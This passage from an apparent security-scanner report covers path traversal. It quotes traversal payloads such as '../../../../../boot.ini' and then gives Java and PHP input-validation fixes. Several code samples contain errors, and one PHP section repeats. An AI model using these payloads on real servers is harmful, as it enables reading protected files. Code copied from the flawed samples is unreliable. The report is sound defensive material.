            <text>Thus, the application will serve the attacker the boot.ini file when it submits the form back to the server.</text>
            <br />
            <text>Note: it is possible to form a variant of this attack, using "\" instead of, or interchanged with, "/". So, ../../../../../boot.ini, ..\..\..\..\..\boot.ini as well as ..\../../..\../boot.ini may be used.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
            <cause>User input is not checked for the '..' (dot dot) string</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to view the contents of any file (for example, databases, user information or configuration files) on the web server (under the permission restrictions of the web server user)</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://phrack.org/issues.html?issue=55&amp;id=7#article">Phrack article: Perl CGI problems</link>
            <link target="http://www.w3.org/Security/Faq/www-security-faq.html">W3 Security FAQ</link>
            <link target="http://www.cert.org/advisories/CA-1997-25.html">CERT Advisory (CA-1997-25): Sanitizing user-supplied data in CGI scripts</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=23">CWE-23: Relative Path Traversal</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>[1] Ensure that the requested file resides in the virtual path of the web server.</text>
              <br />
              <text>[2] Make sure that only certain extensions can be opened</text>
              <br />
              <text>[3] Remove special characters (Meta-characters) from the user's input, e.g. the pipe ("|") character.</text>
              <br />
              <text>[4] Use 'explicit open' mode for files in Perl CGI Scripts.</text>
            </fixRecommendation>
            <fixRecommendation type="ASP.NET">
              <text>ASP.NET provides several means to validate filenames before opening them. For example:</text>
              <br />
              <br />
              <text>[1] The Server.MapPath() method: this method receives a path (string) and maps the specified relative or virtual path to the corresponding physical directory on the server.</text>
              <br />
              <text>Note: the AspEnableParentPaths property's (Metabase property) default value is FALSE, ensuring that scripts will not have access to files outside the application's root directory. Changing the property's value to TRUE constitutes a potential security risk.</text>
              <br />
              <br />
              <text>[2] Path.GetFileName() method: this method effectively removes the last element of the given file path, returning a string consisting of all characters up to (but not including) the last separator character in the file path.</text>
              <br />
              <br />
              <text>Note: an 'ArgumentException' will be raised, if the argument to this method includes an 'InvalidPathChars' such as:</text>
              <br />
              <indentText> a. quote (")</indentText>
              <indentText> b. less than (&lt;)</indentText>
              <indentText> c. greater than (&gt;)</indentText>
              <indentText> d. pipe (|)</indentText>
              <indentText> e. backspace (\b)</indentText>
              <indentText> f. null (\0)</indentText>
              <indentText> g. Unicode characters 16 through 18 and 20 through 25.</indentText>
              <br />
              <text>For security reasons we recommend that you use the Server.MapPath() method before running any input validation on the filename.</text>
            </fixRecommendation>
            <fixRecommendation type="J2EE">
              <text>** File Path Validation:</text>
              <br />
              <br />
              <text>There are several ways to access the file system from the Servlet Container.  However, some of these methods are dangerous because they support file access outside of the web root.  There are two safe Servlet API methods to access a web resource given its virtual path in the server's document tree.  These APIs return null when given a file name that resolves to a value outside the web root.  The following APIs should be used to access configuration files or other files stored under the web root:</text>
              <br />
              <br />
              <text>[1] ServletContext.getResource (or ServletContext.getResourceAsStream)</text>
              <br />
              <text>[2] ServletContext.getRealPath</text>
              <br />
              <br />
              <text>[1] ServletContext.getResource (or ServletContext.getResourceAsStream)</text>
              <br />
              <text>Either ServletContext.getResource or ServletContext.getResourceAsStream can be used to access a resource located at a virtual path (relative to the server's web root).  The resource can be located on a local or remote file system, in a database, or in a .war file.</text>
              <br />
              <br />
              <text>ServletContext.getResource returns a URL to the resource that is mapped to the specified path.  It returns null if no resource is mapped to the specified path.  It throws a MalFormedURLException if the specified path is not in the correct form.</text>
              <br />
              <br />
              <text>ServletContext.getResourceAsStream returns an InputStream object to the resource that is mapped to the specified path.  It returns null if no valid resource is mapped to the specified path.</text>
              <br />
              <br />
              <text>The following example illustrates how to load a Servlet configuration file, named servlet.xml, which resides in the WEB-INF directory of the application:</text>
              <br />
              <br />
              <code>  // Example to load the /WEB-INF/servlet.xml configuration file
  URL url = getServletContext().getResource("/WEB-INF/servlet.xml");
  // Acquire an input stream to the config resource
  InputStream configInput = url.openStream();
  ...
</code>
              <br />
              <br />
              <text>Alternatively, use the ServletContext.getResourceAsStream method to directly acquire an input stream to the configuration file as illustrated in the following example:</text>
              <br />
              <br />
              <code>  // Example to acquire an input stream to a resource
  InputStream configInput = getServletContext().getResourceAsStream("/WEB-INF/servlet.xml");
  ...
</code>
              <br />
              <br />
              <text>[2] ServletContext.getRealPath</text>
              <br />
              <text>This method returns the real path of a resource given its virtual path (relative to the server's web root).  The real path returned will be in a form appropriate to the computer and operating system on which the Servlet container is running, including the proper path separators.</text>
              <br />
              <br />
              <text>This method is less general than ServletContext.getResource (or ServletContext.getResourceAsStream), because it doesn't allow access to resources which are not stored in local files.  It returns null if the Servlet container cannot translate the virtual path to a real path for any reason (such as when the content is being made available from a .war archive).</text>
              <br />
              <br />
              <text>Note that the Servlet engine is responsible for implementing the ServletContext.getRealPath method.  This may not be consistently or correctly implemented in all Servlet engines.  Always verify the returned path as illustrated in the following example:</text>
              <br />
              <br />
              <code>  // Example to access a resource using ServletContext.getRealPath
  // Get the virtual path parameter from the http request
  String virtualPath = request.getParameter("virtual_path");
  String realPath = getServletContext().getRealPath(virtualPath);
  if (realPath != null) {
      // verify that realPath is valid
      File file = new File(realPath);
      if (!file.exists()) {
          // oops, invalid path
  ...
      }
  }
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>N/A.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/products/servlet/2.2/javadoc/javax/servlet/ServletContext.html#getResource(java.lang.String)">http://java.sun.com/products/servlet/2.2/javadoc/javax/servlet/ServletContext.html#getResource(java.lang.String)</link>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/products/servlet/2.2/javadoc/javax/servlet/ServletContext.html#getResourceAsStream(java.lang.String)">http://java.sun.com/products/servlet/2.2/javadoc/javax/servlet/ServletContext.html#getResourceAsStream(java.lang.String)</link>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/products/servlet/2.2/javadoc/javax/servlet/ServletContext.html#getRealPath(java.lang.String)">http://java.sun.com/products/servlet/2.2/javadoc/javax/servlet/ServletContext.html#getRealPath(java.lang.String)</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier, using Servlets.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement the above routine as static methods in a "Validator" utility class.  The following sections describe an example validator class.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.  </text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // Java example to validate required fields
  public Class Validator {
  ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
  ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
  ...
  }
</code>
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.  Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text>
              <br />
              <br />
              <text>Example of how to validate a numeric field (type int):</text>
              <br />
              <br />
              <code>  // Java example to validate that a field is an int number
  public Class Validator {
  ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
  ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
  ...
  }
</code>
              <br />
              <br />
              <text>A good practice is to convert all HTTP request parameters to their respective data types.  Store the "integerValue" of a request parameter in a request attribute and use it as shown in the following example:</text>
              <br />
              <br />
              <code>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</code>
              <br />
              <br />
              <text>The primary Java data types that the application should handle:</text>
              <br />
              <text>- Byte</text>
              <br />
              <text>- Short</text>
              <br />
              <text>- Integer</text>
              <br />
              <text>- Long</text>
              <br />
              <text>- Float</text>
              <br />
              <text>- Double</text>
              <br />
              <text>- Date</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text>
              <br />
              <br />
              <code>  // Example to validate the field length
  public Class Validator {
  ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
  ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
  ...
      }
  }
</code>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate that the input numberOfChoices is between 10 and 20:</text>
              <br />
              <br />
              <code>  // Example to validate the field range
  public Class Validator {
  ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
  ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
  ...
          }
      }
  }
</code>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate the user selection against a list of allowed options:</text>
              <br />
              <br />
              <code>  // Example to validate user selection against a list of options
  public Class Validator {
  ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
  ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
  ...
  }
</code>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that the user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]*$</text>
              <br />
              <br />
              <text>Java 1.3 or earlier versions do not include any regular expression packages.  Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support.  </text>
              <br />
              <br />
              <text>Example to perform regular expression validation:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
  ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
  ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
  ...
  }
</code>
              <br />
              <br />
              <text>Java 1.4 introduced a new regular expression package (java.util.regex).  Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
  ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
  ...
  }
</code>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>Use the javax.servlet.http.Cookie object to validate the cookie value.  The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>Example to validate a required cookie value:</text>
              <br />
              <br />
              <code>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
  ...
              }
          }    
      }
  }
</code>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text>
              <br />
              <br />
              <code>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
  ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&amp;lt;");
                  break;
              case '&gt;': 
                  result.append("&amp;gt;");
                  break;
              case '"': 
                  result.append("&amp;quot;");
                  break;
              case '\'': 
                  result.append("&amp;#39;");
                  break;
              case '%': 
                  result.append("&amp;#37;");
                  break;
              case ';': 
                  result.append("&amp;#59;");
                  break;
              case '(': 
                  result.append("&amp;#40;");
                  break;
              case ')': 
                  result.append("&amp;#41;");
                  break;
              case '&amp;': 
                  result.append("&amp;amp;");
                  break;
              case '+':
                  result.append("&amp;#43;");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
  ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</code>
              <br />
              <br />
              <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text>
              <br />
              <br />
              <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text>
              <br />
              <br />
              <code>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
  ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
  ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  }
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie  using  a secure protocol, such as HTTPS or SSL.</text>
              <br />
              <br />
              <text>Example to secure the "user" cookie:</text>
              <br />
              <br />
              <code>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text>
              <br />
              <br />
              <text>Struts defines the following basic input validators, but custom validators may also be defined:</text>
              <br />
              <text>required: succeeds if the field contains any characters other than whitespace.</text>
              <br />
              <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text>
              <br />
              <text>range: succeeds if the value is within the values given by the min and max attributes ((value &gt;= min) &amp; (value &lt;= max)).</text>
              <br />
              <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text>
              <br />
              <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text>
              <br />
              <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text>
              <br />
              <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text>
              <br />
              <text>creditCard: succeeds if the value could be a valid credit card number.</text>
              <br />
              <text>email: succeeds if the value could be a valid e-mail address.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
  ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
  ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
  ...
          &lt;/form&gt;
  ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events, and validate input.</text>
              <br />
              <br />
              <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text>
              <br />
              <text>validate_doublerange: registers a DoubleRangeValidator on a component.</text>
              <br />
              <text>validate_length: registers a LengthValidator on a component.</text>
              <br />
              <text>validate_longrange: registers a LongRangeValidator on a component.</text>
              <br />
              <text>validate_required: registers a RequiredValidator on a component.</text>
              <br />
              <text>validate_stringrange: registers a StringRangeValidator on a component.</text>
              <br />
              <text>validator: registers a custom Validator on a component.</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text>
              <br />
              <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance.</text>
              <br />
              <text>output_date: displays a java.util.Date formatted with a java.text.Date instance.</text>
              <br />
              <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance.</text>
              <br />
              <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance.</text>
              <br />
              <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat.</text>
              <br />
              <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat.</text>
              <br />
              <text>input_text: accepts a text string of one line.</text>
              <br />
              <text>output_text: displays a text string of one line.</text>
              <br />
              <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance.</text>
              <br />
              <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance.</text>
              <br />
              <text>input_hidden: allows a page author to include a hidden variable in a page.</text>
              <br />
              <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed.</text>
              <br />
              <text>input_textarea: accepts multiple lines of text.</text>
              <br />
              <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier.</text>
              <br />
              <text>output_label: displays a nested component as a label for a specified input field.</text>
              <br />
              <text>output_message: displays a localized message.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
            </fixRecommendation>
            <fixRecommendation type="PHP">
              <text>** File Path Validation:</text>
              <br />
              <br />
              <text>PHP provides several means to validate filenames before opening them. For example:</text>
              <br />
              <br />
              <text>[1] The file_exists() method: this method checks whether a file or directory exists.  It will return True if the file or directory exists, and false otherwise.</text>
              <br />
              <br />
              <code>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (file_exists($filename)) 
      {
          echo "The file $filename exists";
      } 
      else 
      {
          echo "The file $filename does not exist";
      }
  ?&gt;
</code>
              <br />
              <br />
              <text>[2] The is_file() method: this method tells whether the filename is a regular file, returning True if this is the case.</text>
              <br />
              <br />
              <code>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (is_file($filename)) 
      {
          echo "The file $filename is a regular file";
      } 
      else 
      {
          echo "There is a problem with the file: $filename";
      }
  ?&gt;
</code>
              <br />
              <br />
              <text>[3] When performing file operations that involve user input, you should always check that the specified file name and path conform to certain restrictions. Specifically, you should ensure that file operations are only permitted within a predefined directory tree. Checking if a given pathname starts with the desired directory name is not enough since an attacker may trick the application to serve files outside of the desired directory, by using path traversal attacks, for example - "../../../../" (note: this string can also be encoded in many different forms to bypass string matching algorithms).</text>
              <br />
              <br />
              <text>Here are two PHP functions, that might become helpful when attempting to validate user supplied file names:</text>
              <br />
              <br />
              <text>realpath() - returns canonicalized absolute pathname</text>
              <br />
              <text>basename() - Returns filename component of path</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] PHP Manual - realpath(): </text>
              <link target="http://www.php.net/realpath">http://www.php.net/realpath</link>
              <br />
              <text>[2] PHP Manual - basename(): </text>
              <link target="http://www.php.net/basename">http://www.php.net/basename</link>
              <br />
              <text>[3] PHP Manual - file_exists(): </text>
              <link target="http://www.php.net/file_exists">http://www.php.net/file_exists</link>
              <br />
              <text>[4] PHP Manual - is_file(): </text>
              <link target="http://www.php.net/is_file**">http://www.php.net/is_file**</link>
              <text>File Path Validation:</text>
              <br />
              <br />
              <text>PHP provides several means to validate filenames before opening them. For example:</text>
              <br />
              <br />
              <text>[1] The file_exists() method: this method checks whether a file or directory exists.  It will return True if the file or directory exists, and false otherwise.</text>
              <br />
              <br />
              <code>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (file_exists($filename)) 
      {
          echo "The file $filename exists";
      } 
      else 
      {
          echo "The file $filename does not exist";
      }
  ?&gt;
</code>
              <br />
              <br />
              <text>[2] The is_file() method: this method tells whether the filename is a regular file, returning True if this is the case.</text>
              <br />
              <br />
              <code>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (is_file($filename)) 
      {
          echo "The file $filename is a regular file";
      } 
      else 
      {
          echo "There is a problem with the file: $filename";
      }
  ?&gt;
</code>
              <br />
              <br />
              <text>[3] When performing file operations that involve user input, you should always check that the specified file name and path conform to certain restrictions. Specifically, you should ensure that file operations are only permitted within a predefined directory tree. Checking if a given pathname starts with the desired directory name is not enough since an attacker may trick the application to serve files outside of the desired directory, by using path traversal attacks, for example - "../../../../" (note: this string can also be encoded in many different forms to bypass string matching algorithms).</text>
              <br />
              <br />
              <text>Here are two PHP functions, that might become helpful when attempting to validate user supplied file names:</text>
              <br />
              <br />
              <text>realpath() - returns canonicalized absolute pathname</text>
              <br />
              <text>basename() - Returns filename component of path</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] PHP Manual - realpath(): </text>
              <link target="http://www.php.net/realpath">http://www.php.net/realpath</link>
              <br />
              <text>[2] PHP Manual - basename(): </text>
              <link target="http://www.php.net/basename">http://www.php.net/basename</link>
              <br />
              <text>[3] PHP Manual - file_exists(): </text>
              <link target="http://www.php.net/file_exists">http://www.php.net/file_exists</link>
              <br />
              <text>[4] PHP Manual - is_file(): </text>
              <link target="http://www.php.net/is_file">http://www.php.net/is_file</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must always be performed on the server-tier.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement a function or functions that validates each application parameter.  The following sections describe some example checking.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.</text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]+$</text>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
